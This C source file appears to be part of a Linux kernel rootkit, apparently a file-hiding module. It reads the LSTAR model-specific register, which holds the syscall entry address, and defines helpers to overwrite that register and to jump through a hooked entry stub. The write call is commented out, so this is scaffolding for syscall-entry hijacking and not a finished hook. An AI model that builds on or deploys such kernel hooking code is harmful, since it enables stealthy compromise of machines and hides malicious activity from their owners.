#include <linux/kernel.h>
#include <asm/nospec-branch.h>

#include "filehide_lstar.h"
#include "common.h"

static unsigned long read_lstar(void);
static void write_lstar(unsigned int low, unsigned int high);
static void hooked_lstar(void);

unsigned long lstar_addr;

void
test_lstar(void)
{
    lstar_addr = read_lstar();
    DEBUG_INFO("LSTAR before is %0lx\n", lstar_addr);

    unsigned int low = (int)((unsigned long) lstar_addr & 0xFFFFFFFF);
    unsigned int high = (int)((unsigned long) lstar_addr >> 32);

    // write_lstar((low + 4), high);

    DEBUG_INFO("LSTAR after is %0lx\n", read_lstar());
}

static void
hooked_lstar(void)
{
    __asm__ volatile (
        "\tjmp *%0\n"
        :: "m"(lstar_addr));
}

static unsigned long 
read_lstar(void)
{
    unsigned int low, high;

    __asm__ volatile (
                    "movl $0xc0000082, %%ecx\n\t" //https://elixir.bootlin.com/linux/v4.19/source/arch/x86/include/asm/msr-index.h#L15
                    "rdmsr\n\t"
                    "mov %%eax, %[low]\n\t"
                    "mov %%edx, %[high]"
                    : [low] "=r" (low), [high] "=r" (high) 
                    :
                    : "ecx", "eax", "edx"
    );

    //Get two 32bit values into a 64bit variable
    unsigned long ret = high;
    ret <<= 32;
    ret |= low;

    return ret;
}

static void
write_lstar(unsigned int low, unsigned int high)
{
    __asm__ volatile (
                    "movl $0xc0000082, %%ecx\n\t" //https://elixir.bootlin.com/linux/v4.19/source/arch/x86/include/asm/msr-index.h#L15
                    "mov %[low], %%eax\n\t"
                    "mov %[high], %%edx\n\t"
                    "wrmsr"
                    :
                    : [low] "r" (low), [high] "r" (high) 
                    : "ecx", "eax", "edx"
    );
}